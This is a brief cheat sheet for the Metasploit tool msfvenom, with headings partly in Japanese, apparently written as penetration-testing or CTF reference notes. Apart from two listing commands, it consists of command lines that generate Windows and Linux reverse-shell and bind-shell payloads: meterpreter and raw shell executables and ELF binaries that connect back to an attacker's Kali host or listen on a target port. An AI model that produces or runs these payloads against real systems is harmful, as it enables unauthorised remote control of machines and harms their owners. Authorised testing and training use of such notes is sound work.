# msfvenom

## リスティング

``` shell
    msfvenom -l payloads #Payloads
    msfvenom -l encoders #Encoders
```

## Windows

* ReverseShell

``` shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali IP> LPORT=<kali Port> -f exe > reverse.exe
```

* BindShell

``` shell
   msfvenom -p windows/meterpreter/bind_tcp RHOST=<target IP> LPORT=<kali Port> -f exe > bind.exe 
```

## Linux

* ReverseShell

``` shell
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<kali IP> LPORT=<kali Port> -f elf > reverse.elf

    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=<kali Port> -f elf > shell.elf
```

* Bind Shell

``` shell
    msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<target IP> LPORT=<kali Port> -f elf > bind.elf
```
